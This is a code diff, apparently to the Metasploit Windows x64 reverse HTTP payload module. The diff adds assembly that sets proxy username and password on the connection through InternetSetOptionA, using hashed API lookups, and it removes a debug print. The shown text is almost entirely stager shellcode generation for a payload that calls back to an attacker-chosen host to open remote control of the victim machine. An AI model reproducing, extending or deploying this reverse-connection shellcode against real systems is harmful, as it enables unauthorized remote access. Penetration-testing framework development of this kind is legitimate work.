@@ -237,12 +237,12 @@ module Payload::Windows::ReverseHttp_x64
     ^
 
     asm << %Q^
-        call internetconnect
+        call internetconnect          ; puts proxy host pointer on stack
       get_server_host:
         db "#{opts[:host]}", 0x00
 
       internetconnect:
-        pop rdx                       ; String (lpszServerName)
+        pop rdx                       ; contains proxy host pointer
         mov rcx, rax                  ; HINTERNET (hInternet)
         mov r8, #{opts[:port]}        ; 
         xor r9, r9                    ; String (lpszUsername)
@@ -252,7 +252,64 @@ module Payload::Windows::ReverseHttp_x64
         push 0                        ; alignment
         mov r10, 0xC69F8957           ; hash( "wininet.dll", "InternetConnectA" )
         call rbp
+    ^
 
+    if proxy_enabled
+      # only store connection handle if something is set!
+      if proxy_user || proxy_pass
+        asm << %Q^
+        mov rsi, rax                  ; Store hConnection in rsi
+        ^
+      end
+
+      if proxy_user
+        asm << %Q^
+        call internetsetoption_proxy_user ; puts proxy_user pointer on stack
+      get_proxy_user:
+        db "#{proxy_user}", 0x00
+      internetsetoption_proxy_user:
+        pop r8                        ; contains proxy_user pointer
+        mov rcx, rsi                  ; (hConnection)
+        push 43                       ; INTERNET_OPTION_PROXY_USERNAME
+        pop rdx
+        push #{proxy_user.length}     ; proxy_user length
+        pop r9
+        mov r10, 0x869E4675           ; hash( "wininet.dll", "InternetSetOptionA" )
+        ; TODO: Without these pushes, things crashed. Not sure why.
+        push 0                        ; alignment
+        push 0                        ; alignment
+        call rbp
+        ^
+      end
+
+      if proxy_pass
+        asm << %Q^
+        call internetsetoption_proxy_pass ; puts proxy_pass pointer on stack
+      get_proxy_pass:
+        db "#{proxy_pass}", 0x00
+      internetsetoption_proxy_pass:
+        pop r8                        ; contains proxy_pass pointer
+        mov rcx, rsi                  ; (hConnection)
+        push 44                       ; INTERNET_OPTION_PROXY_PASSWORD
+        pop rdx
+        push #{proxy_pass.length}     ; proxy_pass length
+        pop r9
+        mov r10, 0x869E4675           ; hash( "wininet.dll", "InternetSetOptionA" )
+        ; TODO: Without these pushes, things crashed. Not sure why.
+        push 0                        ; alignment
+        push 0                        ; alignment
+        call rbp
+        ^
+      end
+
+      if proxy_user || proxy_pass
+        asm << %Q^
+        mov rax, rsi                  ; Restore hConnection in rax
+        ^
+      end
+    end
+
+    asm << %Q^
         call httpopenrequest
       get_server_uri:
         db "#{opts[:url]}",0x00
@@ -374,7 +431,6 @@ module Payload::Windows::ReverseHttp_x64
       asm << asm_exitfunk(opts)
     end
 
-    STDERR.puts(asm)
     asm
   end
 
